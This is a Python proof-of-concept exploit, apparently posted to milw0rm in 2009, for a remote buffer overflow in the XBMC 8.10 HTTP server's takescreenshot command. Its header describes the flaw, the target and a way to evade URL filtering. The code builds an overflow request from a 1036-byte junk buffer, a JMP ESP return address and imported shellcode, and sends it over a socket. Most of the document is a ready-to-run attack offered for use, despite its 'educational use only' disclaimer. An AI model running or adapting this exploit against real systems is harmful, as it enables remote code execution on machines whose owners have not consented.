#!/usr/bin/env python 
'''
Xbmc takescreenshot request remote buffer overflow 8.10 !!! 
 
Tested:Win xp sp2 eng 
Vendor url:http://xbmc.org/ 
Release date:April the 1st 2009
 
versions affected: 
Linux windows < tested 
other versions are also possibly affected. 
 
Restrictions:No restrictions 

This exploit happens when parsing and overly long file name
to the server using the takescreenshot command.
there is a description in the poc code.

When passing this to the http server we can evade url: filtering
as it is passed to the application as an overly long dir.
This means we can use any shell code we wish.

We are able to overwrite the exception handlers also so 
creating a reliable exploit for vista and xps3 shouldn't 
be to hard have a look there are some modules loaded with 
out /safe seh. 

Credits to n00b for finding the buffer overflow and writing 
poc code and exploit.

----------
Disclaimer
----------
The information in this advisory and any of its
demonstrations is provided "as is" without any
warranty of any kind.

I am not liable for any direct or indirect damages
caused as a result of using the information or
demonstrations provided in any part of this advisory.
Educational use only..!!
'''

#!/usr/bin/python

import socket
from payload import buf
import struct
def shell_attack(target_machine, target_port):
	
    port = target_port
    host = target_machine

    Start_url ='xbmcCmds/xbmcHttp?command=takescreenshot('
    Junk_buffer = 'A'*1036
    Jump_esp = struct.pack('<L',0x77F84143)
    


    End_url ='.jpg;false;0;300;200;90)'

    # create a socket object called 'c' 
    c = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

    # connect to the socket 
    c.connect((host, port)) 

    Request = (Start_url + Junk_buffer + Jump_esp + buf + End_url)

    # create a file-like object to read 
    fileobj = c.makefile('r', 0) 

    # Ask the server for the file 
    fileobj.write("GET /"+Request+" HTTP/1.1\n\n") 

    # milw0rm.com [2009-04-01]